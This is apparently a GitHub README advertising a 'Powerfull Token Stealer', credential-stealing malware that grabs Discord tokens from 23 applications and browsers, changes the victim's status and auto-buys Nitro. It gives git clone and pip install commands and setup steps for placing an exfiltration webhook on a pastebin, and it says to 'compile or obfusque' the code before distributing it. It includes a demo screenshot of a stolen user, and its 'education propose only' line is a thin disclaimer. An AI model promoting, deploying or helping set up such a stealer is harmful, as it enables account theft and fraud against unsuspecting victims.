<p align='center'>
  <b>🐲 Follow me here 🐲</b><br>  
  <a href="https://discord.gg/AkCCYDydKC">Discord</a> |
  <a href="https://www.youtube.com/channel/UC-XII5SSqbMOF1UX3N0Gl8g">YouTube</a> |
  <a href="https://github.com/KanekiWeb">Github</a><br><br>
</p>

##  


### ☕ Usage  
- #### 💻 Downloading
     ```
    >> git clone https://github.com/KanekiWeb/Powerfull-Token-Stealer
    >> pip install -r requirements.txt
    ```
- #### 🖥️ Starting
      1 - Git clone the repo
      2 - Upload your webhook on a pastebin
      3 - Line 173 Replace `https://pastebin.com/raw/XXXXXXXX` by your pastebin link (with raw)
      5 - Compile or obfusque your code and enjoy
      
##  

### 🏆 Features List
- Simple Usage
- 1 Module Require
- Auto Install Module
- Webhook in pastebin.com/raw/XXXXXXXX
- Change Custom Status
- Grab on 23 Applications/Navigateurs
- Auto Nitro purchaser

##   

### 📸 Demos
- #### user Stealed
    <img src="https://media.discordapp.net/attachments/921472632283598898/924761259533025331/ByYOMeAVzDiVAAAAAElFTkSuQmCC.png?width=354&height=600">

##   

### 🧰 Support
- Email: <kaneki_pro@protonmail.com>
- Discord: https://kanekiweb.tk/discord

##  

### 📜 License & Warning
- Make for education propose only !
- Under licensed MIT MIT License.

##  

<p align="center">
  <img src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat" alt="Contribution Welcome">
  <img src="https://img.shields.io/badge/License-GPLv3-blue.svg" alt="License Badge">
  <img src="https://badges.frapsoft.com/os/v3/open-source.svg?v=103" alt="Open Source">
  <img src="https://visitor-badge.laobi.icu/badge?page_id=KanekiWeb.Powerfull-Token-Stealer" alt="Visitor Count">
</p>
